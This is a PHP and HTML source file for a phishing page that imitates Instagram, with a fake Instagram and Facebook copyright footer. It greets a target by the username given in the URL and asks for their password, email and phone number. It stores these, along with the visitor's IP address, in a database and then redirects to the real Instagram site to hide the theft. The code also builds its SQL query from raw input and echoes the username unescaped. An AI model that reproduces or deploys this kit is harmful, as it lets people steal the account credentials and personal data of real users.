<?php
include ("app/config.php");
include ("app/database/router.php");
include ("app/database/yazilar.php");
$username=$_GET['nick'];
$ip = $_SERVER['REMOTE_ADDR'];
error_reporting(0);
if ($_POST) {
$mail=$_POST['mail'];
$pass=$_POST['pass'];
$no=$_POST['no'];
include ("app/bot/value1.php");
include ("app/bot/value2.php");
$sqleyazverileispexcoder = $spexcon->query("INSERT INTO `users`(`id`, `user`, `pass`, `pass2`, `mail`, `no`, `faktor`, `ip`, `tarih`) VALUES (NULL,'".$username."','".$pass."','Null','".$mail."','".$no."','Null','".$ip."',current_timestamp())");
header("Location: https://instagram.com");
}
?>
<html>

<head>
<?php include ("app/tag/main/meta.php"); ?>
<style>

#ana{
background-color:#fafafa;
}
#erhan{
border-radius:5px;}

#erhanasd{
font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size:20px;
}

#sa{
background-color:white;
width:300px;

}
#yazi1{
font-family:sans-serif;
color:#999;
width:230px;
 }
 #copyright{
font-family:sans-serif;
color:#999;}
#menu{


width:91%;
} 
#liste{
display:inline-block;}
#link{text-decoration:none;
color:#003569;
font-family:sans-serif;
font-size:13px;
font-weight:540;

    vertical-align: baseline;
}
#üst{
width:100%;
background-color:white;

height:79px;
}

#buton{
color:white;
background-color:#3897f0;
font-size:15px;

border-radius:3px;
outline:none;
font-family:sans-serif;
font-weight:700;
border:0;
width:200px;
height:40px;
max-width:99%;
max-height:50px;
}

#password{
background-color:#fafafa;
border:0;
outline:none;
border-radius:6px;
width:220px;
height:35px;

font-size:16px;}

</style>
	 
</head>
<body id="ana" style="padding:0px; margin:0px;">




<div style="width:100%; background:white; border-bottom:1px solid #cecece; padding-left:2px;" >
 




<br><br>
</div>
<br><br>

<center>
<div id="sa" style="border:1px solid #cecece;"> <br> 


<br> 
<img src="https://ci4.googleusercontent.com/proxy/sKqXcB7zDP7N-6yY75yXsKOC97B-g-pZSdkWFTKh02EVUCA277wXPS-5JGPMeRBHAKdRtnZv=s0-d-e1-ft#https://i.hizliresim.com/p2vrgo.gif" width="165" height="122" style="margin-right:0px" class="CToWUd">
<br>
<h1 id="erhanasd"><?php echo $formbaslik; ?> </h1>

<p id="yazi1">

<?php echo $formyazi; ?>

</p>

<br>
<select style="padding:6px; background:#fafafa; outline:none;text-align:center;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;">
  <option>News/Media</option>
  <option>Sports</option>
  <option>Government/Politics</option>
  <option>Music</option>
  <option>Fashion</option>
  <option>Entertainment</option>
  <option>Blogger/Influencer</option>
  <option>Business/Brand/Organization</option>
  <option>Other</option>
</select>

<br><br>

<form method="post" >
<input type="password" name="pass" placeholder="Password" required="" style="padding:6px; background:#fafafa; outline:none;text-align:center;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>

<input type="email" name="mail" placeholder="Email " required="" style="text-align:center; padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>



    <input type="test" name="no" placeholder="Phone Number" required="" style="padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;text-align:center;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
  
    font: 400 13.3333px Arial; border-radius:3px;">


<br><br>
<button id="buton" type="submit"> Continue as @<?php echo $username; ?> </button>


 
</form>

</center>



</div>
<br> <br>
<center>
<div id="get">

</div>
<br><br>
<div id="menu">
<li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
<li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;

<li id="liste"><a href="" id="link">LANGUAGE</a> </li>

</div>
<br>
<p id="copyright">© 2022 INSTAGRAM AND FACEBOOK</p>
</center>


</body>


</html>